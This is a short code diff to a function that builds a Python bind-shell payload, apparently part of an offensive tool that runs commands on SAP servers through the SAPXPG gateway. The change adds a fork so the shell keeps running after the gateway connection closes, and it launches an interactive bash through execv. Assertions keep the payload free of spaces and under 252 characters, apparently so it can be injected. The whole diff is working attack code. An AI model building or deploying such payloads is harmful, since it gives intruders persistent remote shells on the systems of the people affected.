@@ -427,16 +427,19 @@ def _generate_bind_payload(os_type: str, port: int) -> dict:
         py_code = (
             f"import(socket,os,subprocess);"  # dummy — replaced below
         )
-        # Build compact code under 250 chars
+        # Build compact code under 250 chars.
+        # CRITICAL: must fork() so the bind shell survives after
+        # SAPXPG/GW connection closes (P4 timeout kills the process).
         py_code = (
             f"o=__import__('os');"
+            f"o.fork()and(o._exit(0));"
             f"s=__import__('socket').socket(2,1);"
             f"s.setsockopt(1,2,1);"
             f"s.bind(('',{port}));"
             f"s.listen(1);"
             f"c,a=s.accept();"
             f"[o.dup2(c.fileno(),i)for(i)in(0,1,2)];"
-            f"__import__('subprocess').call(['/bin/bash','-i'])"
+            f"o.execv('/bin/bash',['/bin/bash','-i'])"
         )
         assert " " not in py_code, f"Space in bind payload: {py_code}"
         assert len(py_code) < 252, f"Bind payload too long: {len(py_code)} chars"
